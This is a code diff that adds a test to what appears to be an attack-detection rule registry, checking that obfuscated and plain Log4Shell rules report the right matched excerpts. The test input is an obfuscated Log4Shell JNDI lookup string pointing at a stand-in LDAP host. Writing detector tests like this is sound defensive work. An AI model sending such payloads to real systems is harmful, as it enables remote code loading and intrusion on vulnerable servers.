@@ -114,6 +114,16 @@ def test_detection_carries_rule_metadata_and_excerpt(registry: RuleRegistry) -> 
     assert by_rule["log4shell.jndi_lookup"].severity.value == "critical"
 
 
+def test_obfuscated_excerpt_is_the_payload_as_sent(registry: RuleRegistry) -> None:
+    payload = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}"
+
+    detections = registry.evaluate(_request(query=f"a=${{price}}&x={payload}&y=1"))
+
+    by_rule = {d.rule: d for d in detections}
+    assert by_rule["log4shell.jndi_obfuscated"].matched_excerpt == payload
+    assert by_rule["log4shell.jndi_lookup"].matched_excerpt == "${jndi:ldap://evil.example/a}"
+
+
 @pytest.mark.parametrize(
     ("raw", "resolved"),
     [
